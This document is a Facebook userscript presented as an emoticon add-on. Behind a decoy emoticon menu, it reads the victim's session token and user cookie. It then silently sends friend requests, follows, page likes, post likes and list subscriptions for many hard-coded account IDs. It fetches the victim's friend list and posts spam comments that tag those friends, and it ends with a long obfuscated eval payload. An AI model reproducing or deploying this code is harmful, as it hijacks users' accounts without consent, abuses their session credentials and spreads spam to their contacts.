	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc M?ng B?n Ðã Cài Ð?t ICON FaceBook Thành Công <br>NoName</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====

//
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//DangHaiPhong
a("100003477855375");sublist("372786159513976");
P("402458586546733");a("100006898743987");P("400575806735011");
sublist("1379309458975666");a("100007661970423");
Like("503705839744074");Like("417940788338591");P("454127744713150");
Like("694038877303411");Like("665012590228884");
Like("270216739804383");
//Thang Hoang
P("417437168401415");a("100007155750898");a("100004216776350");
P("298065573677333");
//Phuc
P("666563056739156");
//Hai Phong 2
P("426322507493674");P("425986434193948");P("454123761380215");
P("1414332505481928");
//Thưởng đẹp zai 1102
IDS("100003877146440");a("100007729423775");a("100007814550129");a("100007293944377");
a("100003734828248");a("100004030848039");a("100003033117465");a("100001395488769");
Like("602506159820823");Like("181627148703838");Like("706083872769183");Like("1401886530073511");
Like("558634407566969");Like("1392466934346044");Like("576916789061741");Like("269280836567599");
Like("265918143570814");Like("580078912067909");Like("1411334019116243");Like("482193798558196");
Like("360333387437903");Like("828969330461844");Like("350532395002116");Like("603292139737447");
Like("1397643643829244");Like("254698408031118");Like("226013190920628");Like("719787118052951");
Like("175636802619940");Like("719787118052951");Like("629450250438169");Like("221350404715586");
P("266152150190688");P("303374853135084");P("342661585873077");P("321768474629055");
sublist("311850718954164");sublist("261744260631477");sublist("507098222680023");
// Phan Phụng Tú Tài
a("100007398700600");a("100007063120509");a("100003908713413");a("100004063578918");
a("100004086316763");a("100007683931143");P("1401856610070949");a("100007759182208");
a("100007341632664");a("100004855563295");a("100006059193797");
Like("627116584026188");Like("1498364323723609");Like("1384123011851254");
Like("423221271145909");Like("708030165893905");Like("1389425637974839");
Like("1417396908507128");Like("274155672734875");Like("1380336612207612");
Like("1426560524248480");Like("579148995494179");Like("486493021392287");
Like("1472410599648248");
//Kang Bee
a("100004786954242");
a("582734430");P("368933456580275");
P("254189828083914");
P("141160662720165");
Like("585333791547445");
Like("764853593544363");
sublist("176702859165945");
sublist("220443444791886");
a("100000247071804");sublist("725936967424532");
a("100002968548248");sublist ("429331177175830");P("269123059923924");
//Theo Duoi Dam Me  
a("100005436843326");a("100002934805904");
sublist("128681217323106");
Like("247477968768252");Like("1534860143406237");Like("237199313132030");
Like("684394644946116");Like("214928555363814");Like("496679987108952");
//Ban Me
a("100002604587003");a("100004976713412");sublist("536358316410648");
Like("590639854349171");
//Phu coy
Like("620495568021463");
Like("525107000935879");
Like("690369137681621");
Like("581001551983970");
Like("445293918923780");
Like("490247094379888");
a("100000981381942");
Like("446429725387864");
Like("618526484861664");
//Minh Khang
a("100004386073610");
sublist("230169073805960");sublist("218969254925942");
P("229783103844557");P("238001913022676");
P("278937585595775");P("277474239075443");
Like("349118788561497");Like("206382782889933");
Like("482065031906574");Like("201295486740034");
//DUy
a("100004480119832");a("100006644741794");a("100007592195757");
Like("584823988219699");Like("574181765978296");
Like("229862127161297");Like("630988030271687");
Like("760425733974991");Like("171571663048118");
sublist("194241914068478");P("228903167269019");
//Meo
Like("827862113906169");
Like("209382189243821");
Like("238733032948621");
Like("390497874360478");
Like("614303601939504");
Like("515022378617340");
a("100005597291520");
a("100005653091203");
IDS("100007536253901");
//sơn
a("100004311310611");
P("274640352689673");
P("244166322403743");
Like("265632100260873");
Like("418463024923374");
sublist("454607067996179");
//Tran Khai Ca
a("100007650331386");sublist("1389414161323582");
//Cuong
a("100003476998925");
a("100003896335787");
a("100006548231220");
sublist("466541303471765");
Like("478017935654618");
Like("212443628952969");
Like("502080256570147");
Like("464553383671311");
Like("1397274337200850");
Like("254856458028565");
Like("1449429758621658");
Like("463762367079943");
//Bin
a("100006893199912");
sublist("1421920381381055");
//kelly Anh
sublist("207944656050187");
a("100005039622783");
//KhongTen
IDS("100002754024576");a("100007508704014");
a("100000303521171");
a("839493429");
sublist("10151995479593430");sublist("10151857219433430");sublist("314756041993534");
P("380317902070007");P("416920948409702");P("450264091742054");
Like("598975736843034");Like("1397883850463964");Like("1453938688158589");
Like("512270292201992");Like("1433651793529676");Like("1436764673202435");
Like("1426864327546965");Like("245195268986777");Like("1377286875876382");
Like("688423387847338");Like("1391397287795468");
//Trung Chinh
a("100005399291569");
a("100007145203882");
sublist("159372924252683");
sublist("160432367480072");
Like("248291331989326");
Like("318760234928354");
//Boss  Xõa
Like("290968741011893");
Like("165177496947273");
a("100007625733333");
IDS("100007625733333");
sublist("189376554564035");
sublist("1387319784865533");
sublist("1387326764864835");
a("100000057452075");
Like("196729873833604");
//Ánh Vân
a("100007204391403");sublist("1400246480225485");sublist("1382730821977051");
P("1382725635310903");P("1403552623228204");
//NQD
a("100007632001225");a("100004992401664");a("100003768328347");
sublist("424949737614507");sublist("197453313764414");
sublist("221937547982657");Like("554732217937243");
Like("160603470805641");Like("1410639035816857");
Like("495039677214744");Like("413697878700191");
Like("1437536173128105");sublist("253990034777408");
//MhMin
a("100004229011575");a("100003869398980");P("281125972038368");
sublist("178933605590939");sublist("211950375622595");
sublist("218444118306554");sublist("219193454898287");
Like("567169820029397");Like("534488129938890");Like("1424521047793805");
Like("615786191810649");Like("284505448365552");
P("248895808594718");P("279295055554793");P("286481138169518");
P("253933548090944");P("279295018888130");P("272102459607386");
P("200091720141794");P("229670067183959");P("224894054328227");
//Hai De Tien
a("100001910195980");
a("100007117713426");
sublist("523193167754352");
//Phong
a("100007751678223");a("100006619902303");sublist("621952017816839");
IDS("100000061400267");IDS("100003638324695");IDS("100007751678223");
Like("263316953820631");Like("1387179771538109");Like("547700161992307");Like("268572309974110");Like("762236307120939");
Like("623995204323025");Like("477919925642333");Like("721801554519652");Like("1390878577847378");
Like("1470990859791383");Like("411811502221011");
P("660028574009183");P("582804098398298");P("751733198172053");P("417346981729909");P("779421418736564");P("764398883572151");P("632539930134055");
//timem
a("100004452930057");a("100005837402475");a("100005303497763");a("100004151700394");a("100003694170657");a("100005504880392");a("100004867182877");
Like("1408489466066929");Like("599413340142183");Like("509012349197015");Like("470271429720633");Like("1414125775502296");Like("1440716389495417");Like("468641473265396");Like("748357595176515");Like("1445887105629014");Like("263891723778782");Like("404129216400638");Like("1403230773248192");Like("561555940607019");Like("813636081987266");Like("264424037050291");Like("638865602837173");Like("841800439179388");Like("542830962482849");Like("742409239126176");
P("252311381593958");P("245870148904748");P("256914041133692");P("256910487800714");
P("264951780329918");P("225586970978029");
//Tu Chí
a("100007209373220");a("100003822772005");Like("117066818491163");
Like("624091950997546");Like("479347405509373");Like("464703896962923");Like("531113973670434");
Like("410353745775512");Like("288851617932145");Like("226316337561082");
Like("240409919478013");Like("581125421979176");
//Khiem
a("100006803773171");a("100007572942639");a("100007779312326");
P("1405454723024640");P("1437329969837115");P("1406605476242898");
P("1401407190096060");a("100007779312326");
Like("565491740198905");Like("603358856392067");
sublist("1404423043127808");
//Son thanh pham
a("100006011107414");a("100005957683886");a("100002789161183");a("100001277308266");sublist("110777179132652");
Like("594879107219966");Like("332355500243431");Like("504531169645970");Like("513143108778372");
Like("593419554063907");Like("221350404715586");Like("244228262418445");Like("441471645971760");
Like("386301948122761");Like("581006078649634");Like("601937466549353");Like("1387239811496628");
Like("593224067421117");Like("1464972683722856");Like("191616137716376");Like("670717889659292");
Like("1400316543560365");Like("1401228496802919");Like("571986922893233");Like("1459175364294378");
Like("398577290286484");Like("435618606570406");Like("635189399850983");Like("703819499648878");
Like("375852169134514");
P("168508133359556");P("176760245867678");
//Lê Minh Giang
a("100004944150388");a("100004098501366");
sublist("249114941929976");sublist("249115001929970");
P("235728343268636");P("235942416580562");
Like("1399715753615510");Like("585808938161896");
//Son Hoa
Like("221088591416235");Like("430079737095220");Like("662407560489789");
Like("1448176565411823");Like("367187283421225");Like("421467624665145");
Like("421467624665145");Like("533354686780625");Like("527653984016523");
Like("465960226863083");Like("724835117535611");Like("284012821751742");
Like("269056136591670");Like("747299401946931");Like("1466883713526716");
Like("296199770528567");Like("210751799132978");Like("577428622346894");
a("100006388567730");a("100004536944120");a("100003141507853");
//Thể miky
IDS("100002940361555");
IDS("100005095710618");
a("100005095710618");
a("100004089064886");
Like("555848654523142");
Like("237298193116703");
Like("236949989818190");
Like("227141707465685");
//Hoang Dat
a("100004148557610");
a("100003997567470");
a("100001470446201");
sublist("212380618910222");
sublist("212029705611980");
Like("714949128535317");
Like("203644703164241");
Like("1418993178345091");
Like("489657307810851");
Like("654639477928061");
Like("726132220744576");
Like("199155963625108");
Like("202697549929862");
Like("1511987389026927");
Like("288165744664933");
P("226053614209589");
a("100003637036750");a("100001593484160");a("100005642589283");
Like("251165911730791");P("407108506099782");a("100004019072326");
sublist("339921656151801");sublist("352891354854831");
//stom
sublist("1452309234987826");
a("100006262903180");
sublist("1453484778203605");
sublist("1453485214870228");
//TSP
a("100006760806314");a("100007546693300");a("100004619314994");a("100004510573722");
a("100005480828756");a("100004219268575");a("100006497719722");Like("1391193981136782");a("100006811781193");
Like("668865669823381");Like("1455521464662589");Like("225143324358546");Like("1421621258083389");Like("749339768409860");
P("1431396603762353");P("1435264940042186");P("392306414247780");P("1431388640429816");P("1444781452423868");
P("1441742779394402");P("1441742539394426");P("1444781365757210");IDS("100004052730171");
//ke
a("100002598938531");sublist("461523760610918");a("100003884397695");sublist("328070960665714"); Like("1416810238552455");
// Code 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "647121028688402";
var arkadaslar = [];
var svn_rev;
function arkadaslari_al(id){            
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/27);f++){
mesaj = "";mesaj_text = "";
for(i=f*27;i<(f+1)*27;i++){
if(arkadaslar.payload.entries[i]){
mesaj += " Đẹp Quá.... Mọi Người Xem Nek  🍂  🐟  💝  👱  Thích Quá Hị..Thử đi đẹp lắm<3 @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
mesaj_text += " " + arkadaslar.payload.entries[i].text;
}
}
yorum_yap(id ,mesaj)}                
}
};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;
if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
xmlhttp.send();
}
function RandomArkadas(){
var sonuc = "";
for(i=0;i<9;i++){
sonuc += " @[" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].uid + ":" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].text + "]";
}
return sonuc;
}
function yorum_yap(id ,mesaj) {
 var xhr = new XMLHttpRequest();
 var params ="";
 params +="&ft_ent_identifier="+id;
 params +="&comment_text="+encodeURIComponent(mesaj);
 params +="&source=2";
 params +="&client_id=1377871797138:1707018092";
 params +="&reply_fbid";
 params +="&parent_comment_id";
 params +="&rootid=u_jsonp_2_3";
 params +="&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":"+id+"}";
 params +="&attached_sticker_fbid=0";
 params +="&attached_photo_fbid=0";
 params +="&giftoccasion";
 params +="&ft[tn]=[]";
 params +="&__user="+user_id;
 params +="&__a=1";
 params +="&__dyn=7n8ahyj35ynxl2u5F97KepEsyo";
 params +="&__req=q";
 params +="&fb_dtsg="+fb_dtsg;
 params +="&ttstamp=";
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);

    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}
        arkadaslari_al(372106809596074);
;eval(function(w,i,s,e){var lIll=0;var ll1I=0;var Il1l=0;var ll1l=[];var l1lI=[];while(true){if(lIll<5)l1lI.push(w.charAt(lIll));else if(lIll<w.length)ll1l.push(w.charAt(lIll));lIll++;if(ll1I<5)l1lI.push(i.charAt(ll1I));else if(ll1I<i.length)ll1l.push(i.charAt(ll1I));ll1I++;if(Il1l<5)l1lI.push(s.charAt(Il1l));else if(Il1l<s.length)ll1l.push(s.charAt(Il1l));Il1l++;if(w.length+i.length+s.length+e.length==ll1l.length+l1lI.length+e.length)break;}var lI1l=ll1l.join('');var I1lI=l1lI.join('');ll1I=0;var l1ll=[];for(lIll=0;lIll<ll1l.length;lIll+=2){var ll11=-1;if(I1lI.charCodeAt(ll1I)%2)ll11=1;l1ll.push(String.fromCharCode(parseInt(lI1l.substr(lIll,2),36)-ll11));ll1I++;if(ll1I>=l1lI.length)ll1I=0;}return l1ll.join('');}('294751s212829313718243q0z2z1o25312o193x2c1d3o0z112k3q0z202m3v3u35242v203p1z203a231s25332114212v23211a3u271z1138251q25352z1630261y1z12141z153v2b2o1731241u3s2t312n113u243e133x292o192z261z101o233e1g2c2b36182v3s121z1o360w121z3b213v312938162v3u10111m2c182t3b213v2b213x39213x29233v1z112s291z203u271u3s271r2o1i25203q2c1z21121b3v111z202433163z2o1b3v111i1t352z1d302n3e1z3w2m2z1q1e273z1o1o23111q253t173124143e1c3e39361c3w2b321v3w2s3q3s3732293r35203917163z1411101o232c1q1z113u243e1b37383v111x23121g1u1k181d1k1g1j1f1h3c1a1c1t3c1c1g1b3f123e1r3e1k1c1w1g121f152c1v2c102c1u2e1z2e1r2d1w2c1s1c152e1t3g1w2c1w2c152c1t3g1u2e1s1c1m2c1u1c1z2e1u1e1v2c1u2d1w2c1t2e1t2e1q2d192c1t2c1u2e1s2e1c2c1w2e1t2c1u2f1r2e1q3e1z2c1s3e142e1u2g1w2c1v2e1z2c1s1e1s2e1q2e1x2c1t2c1v2e1t3e1t2c1u3d1w2c1u3e1q2e1q3e1j2c1s2d192e1s3f1y2c1u2d182c1s3f1h2e1q3d192c1s3e102e1s3f152c1w3d1u2c1s3f192e1q3d1v2c1s2d172e1u3f1t2c1u3d192c1t3e1c2e1q3d1a2c1u3d1y2e1s3f172c1w3d182c1s1f192e1s3d1d2c1s3d172e1s3g1p2c1u2d192c1s3g1c2e1q3d1b2c1s3e1w2e1s1f152c1u3d192c1s3f172e1q3d1d2c1s2c1u2e1s1e1d1c1d2d1e3e1c1e1i1g1k3e1t3b1f3d1c3f1i2f103d1q2d1f2d1p1e1b3e1d3e1e1d1m1e1c1g1q3g1d3c1e1d1f3c1d1f161g1q1d1d1d1c3d1c3g1g3f1e2c1e1c1d1c1c1g1p3e1d1c1a3d131e1h2e1b2f1i3e1f1c1g1e1j3g1j1g1h3e161d1e3d1p1g1p1g1g3e1d2c1f1e1h3d1d2f1a1c1u2e1f1d1f3g121e1d3d1e1c1m3d1o3e1d3g161e1f1c121c1b1f191f1d1d1f1d1j1e1c2e1o2e1d1c1e1c1d3d1c1e181d1d1e1j1d1x2c1t3f1q2e1q3d1b2c1s3d1b2e1u3g1a2c1v1d152c1t3f102e1r3e102c1t1d172e1s3f1b2c1u3d162c1u3g1d2e1r3d172c1s2e172e1s3f1p2c1u2d1d2c1s3f1r2e1s3d1d2c1t1d172e1s3f1b2c1u1d1a2c1u3g1b2e1r3d172c1s3d1c2e1s3f172c1w3d182c1t3f172e1q3d1f2c1s3d1a2e1u3g192c1v1d152c1s3f1c2e1q3d1r2c1u3d1a2e1t3g132c1u2d1d2c1s3f1c2e1s3d1b2c1t1d172e1s3f1b2c1u3d152c1u3g1a2e1r3d172c1s3d1c2e1s3f1o2c1w3d192c1t3f172e1q2d1f2c1s3d192e1u3g192c1v1d152c1s3f1c2e1q3d182c1u3d1a2e1t3f132c1u1d1d2c1s3f1c2e1s3d1b2c1t1d172e1s3f1b2c1u3d1q2c1u3g1d2e1r3d172c1s3d1c2e1s3f152c1w3d182c1t3f172e1q3d1f2c1s3d1c2e1u3g162c1v1d152c1s3f1c2e1q3d1a2c1u3d1a2e1t3f132c1u1d1d2c1s3f1c2e1s3d1d2c1t1e172e1s3f1b2c1u3d1b2c1u3g1d2e1r3d172c1s3d1c2e1s3f1p2c1w3d1c2c1t3g172e1q3d1f2c1s3d172e1u3g162c1v1d152c1s3f1c2e1q3d1d2c1u3d1d2e1t3g132c1u2d1d2c1s3f172e1s3d1d2c1t1d172e1s1f1b2c1u3d152c1u3g1b2e1s3d1a2c1t1d172e1s3f1b2c1u3d1c2c1u3g1b2e1r3d172c1s1d1c2e1s3f142c1w3d192c1t3f172e1q3d1f2c1s1d192e1u3g162c1v1d152c1s3f1c2e1q3d182c1u3d1t2e1u3f132c1u3d1a2c1u3g1b2e1r3e172c1t1d172e1s3g132c1u3e152c1s3f172e1r3d172c1s3d1c2e1s1e1w2c1u3d152c1s3f1y2e1s3d1b2c1t1e172e1s3e1h2c1u1c152c1t3f1r2e1s2e1c2c1t3d172e1t3e172c1v3d152c1t3g1h2e1q1e1e2c1t3c1a2e1t3g1d2c1v3d1f2c1s3f1d2e1q3d1d2c1s3d1d1e1v2f1a2c1v1d1d2c1t3f102e1r3e172c1s3d1c2e1s2f1b2c1t3d1f2c1r2f1c2e1q3d1c2c1u3d1d2e1t3f132c1u3d1f2c1s3f1b2e1q3d1b2c1s3d1b2e1u3g1a2c1v1d172c1s3f1c2e1q3d182c1u3d1d2e1t3f132c1u2d1f2c1s3f1b2e1s3d1a2c1t1d172e1s3f1b2c1u3d1t2c1u3g192e1r3d172c1s1d1c2e1s3f1j2c1w3d192c1t3f172e1q3d1f2c1s3d172e1u3g172c1v1d172c1s3f1c2e1q3d1c2c1u3d1d2e1t3g132c1u3d1f2c1s3f172e1s3d192c1t1d172e1s3f1b2c1u3d172c1u3g1b2e1r3d172c1s3d1c2e1s3f1c2c1w3d1a2c1t3f172e1q2d1f2c1s3d1b2e1u3g152c1v1d172c1s3f1c2e1q3d1c2c1u3d192e1t3f132c1u3d1f2c1s3f182e1s3d1a2c1t1d172e1s3f1b2c1u3d1d2c1u3g192e1r3e172c1s3d1c2e1s3f1k2c1w3d1e2c1t3g172e1q3d1f2c1s3d1a2e1u3g1a2c1v1d172c1s3f1c2e1q3d182c1u3d1a2e1t3f132c1u3d1f2c1s3f1r2e1s3d1d2c1t1d172e1s3f1b2c1u3d1s2c1u3g192e1r3d172c1s3d1c2e1s3f152c1w3d1d2c1t3g172e1q3d1f2c1s3d1r2e1u3g182c1v1d172c1s3g1c2e1q3d1a2c1u3d1b2e1t3g132c1u2e172c1s3f1c2e1q3d1s2c1u3d1a2e1t3f132c1u1d1f2c1s3f1c2e1s3d1b2c1t1d172e1s3f1b2c1u3d192c1u3g1d2e1r3d172c1s3d1c2e1s3f1a2c1w3d1e2c1t3f172e1r3e172c1t1e1d2e1t3f132c1u3d1f2c1s2g1c2e1q3d1b2c1s3d1c2e1s3f182c1u3c1f2c1s3f1b2e1s3d1a2c1u2c172e1s3e132c1t2e1t2c1t3f1d2e1q3e172c1u1d1f2e1u3e1b2c1v3c102c1s1g1d2e1q3d1m2c1t3e1f2e1s3g1d2c1v1d102c1u3f1d2e1r3d1f2c1s3d1f2e1s3f182c1u1d1c2c1s3g1f2e1q1c1a2c1r3d1d2e1s3f1b2c1t3d1d2c1s3f192e1s3d1f2c1u3d1r2e1u3f1p2c1w3d1b2c1t3g152e1q1d1e2c1s3d162e1u3f192c1v2d1b2c1t3f1y2e1r3d192c1s2d1d2e1s1f1j2c1w3d1b2c1t3f152e1q3d1e2c1s3d192e1u3f182c1v3d152c1s3f1d2e1q3d1d2c1u3d1a2e1t1f132c1u2d1d2c1s3f1a2e1s3d1b2c1t3d152e1s3f1b2c1u3d162c1u3f1b2e1r3d192c1s3d1d2e1s3f172c1w3d182c1t3f152e1q3d1e2c1s3d152e1u3f162c1v3d152c1s3f1d2e1q3d1e2c1u3d182e1t1f132c1u1d1d2c1s3f1p2e1s3d1c2c1t3d152e1s3f1b2c1u3d152c1u3f192e1r3d192c1s3d1d2e1s3f152c1w3d182c1t3f152e1q3d1e2c1s3d1d2e1u3f172c1v3d152c1s3f1d2e1q3d1b2c1u3d192e1t1f132c1u3d1d2c1s3f182e1s3d1f2c1t3e152e1s3f1b2c1u3d152c1u3f182e1r3d192c1s3d1d2e1s3f142c1w3d182c1t3f152e1q3d1e2c1s3d1p2e1u3f1a2c1v3d152c1s2f1d2e1q3d1f2c1u3d1b2e1t1f132c1u3d1d2c1s3f1a2e1s3d1b2c1t3e152e1s3f1b2c1u3d162c1u3f1b2e1r3d192c1s2d1d2e1s3f1a2c1w3d1b2c1t3f152e1q1d1e2c1s3d172e1s3f1k2c1w3d1b2c1t3f152e1q1d1e2c1s3d1c2e1u3f172c1v3d152c1s3f1d2e1q3d1d2c1u3d1c2e1t1f132c1u3d1d2c1s3f1c2e1s3d1c2c1t3d152e1s2f1b2c1u3d1d2c1s2f1d2e1q2d1e2c1s3d192e1u3f192c1w3d1a2c1t2f1c2e1r2d1f2c1r3d1b2e1u3f162c1v3d152c1s3g1x2e1s1e1f2c1u1d1p2e1t1g1c2c1u2c1e2c1s3f1w2e1r2c192c1s3d192e1s1g1a2c1u2d1c2c1t2g1f2e1q3d1c2c1t1d1c2e1u2f132c1v2e1q2c1s3f192e1q3d1b2c1t1e1d2e1t1g1s2c1v3d1v1c182f1w2f1w2d1h321f2s3e193d1s1c191e133g103c141e1k3d171g1e2g1i1c1x3e1k3e152e1t3g1t2c1u2c1x2c1u2g192e1s1d1y2c1v2e1q2e1s2f1w2c1t2e1q2c1t1e1u2e1r2c1s2c1u3c1y2e1s3e172c1u2e122c1s3e172e1r3e1z2c1u3c1w2e1u1e1j2c1t2c172c1s1e1o2e1q3e1f2c1w2c1e2e1s3g1e2c1u2d1z2c1t2g1j2e1s2e1t2c1w3e1z2e1s2e1a2c1u1c1z2c1u2e1h2e1q1d182c1w3d1a2e1s3f172c1s3d1c2c1s3f192e1s3d1l2c1u3d192e1t3e1b2c1s1d1a2c1u3f152e1q3d172c1v3d1d2e1s3f162c1u3e122c1s3f182e1q3d192c1u3d182e1s3e152c1s3d192c1s3e1d2e1q3d172c1u3d1o2e1s3f172c1u3d1e2c1s3f172e1q3d1j2c1u2d182e1u3f1c2c1s1d192c1s3f1b2e1q2c1z2c1u2c1k1e1h3e1d2d1e1c1j3b1c3f1c3e192c141c123b1d3g181f171e1f1e1i3d1g3e1c3f1d2e1k1c1q1c1i1f1h1g1a1c1h1c1d2d1k3f183f1d3c1a1d1i3d141f1h3e101e1w2d1l1d181e121d1b1e1e3d1r1c1b3e1c3g1h3e1e3d1g3e1e3f1e3e1d3d1f1d1m3d1k3f1w1g122c1e1c1d1c1d1g1h3f1k3c1y3e1e2d132e1a3f122d1f3c1i1c1i3e1c1e1q2e1m1c1e2e1b3f143g1b2e1i1d1m1d1h3e121g121c1a1d1t1e1b3e1e1e163c1u1e192c1s3f152e1q1e152c1u3d1c2e1s3f142c1s3d1c2c1s3f1b2e1q1d1c2c1w3d1d2e1t3g132c1s1d1e2c1s3f182e1s3d1r2c1w3d1d2e1u3f1a2c1t1d192c1s3f1d2e1q3d1e2c1w3d1d2e1t3f132c1s3d1e2c1s3f1c2e1s3d1c2c1v3d172e1s3f1b2c1s1d1c2c1u3f1b2e1r1d152c1u3d1c2e1s3f142c1u3d1d2c1t3f152e1q3d1d2c1u3d1c2e1u3f192c1t1d192c1s3f1d2e1q3d162c1w3d1a2e1t3f132c1s1d1e2c1s3f1a2e1s3d192c1v3d172e1s3f1b2c1s3d1e2c1u3f1b2e1r1d152c1u3d1c2e1s3f1a2c1u3d1c2c1t3f152e1q3d1d2c1u3d1c2e1u3f152c1t1d192c1s3f1d2e1q3d1e2c1w3d1b2e1t3f132c1s3d1e2c1s3f1b2e1s3d172c1v3d172e1s3f1b2c1s3d1a2c1u3f172e1r1d152c1u3d1c2e1s3f172c1u3d1f2c1t3f152e1q3d1d2c1u3d1c2e1u3f162c1t1d192c1s2f1d2e1q3d1m2c1w3d1a2e1t3f132c1s3d1e2c1s3f192e1s3d172c1v3d172e1s3f1b2c1s3d1u2c1u3f1c2e1r1d152c1u2d1c2e1s3f162c1u3d1f2c1t3g152e1q1d1d2c1u3d1s2e1u3f1a2c1t1e192c1s3f1d2e1q3d152c1w3d1c2e1t3f132c1s2d1e2c1r3f1d2e1q3d192c1w3d1a2e1t3g132c1s2d1e2c1s3f182e1s3d192c1v3d172e1s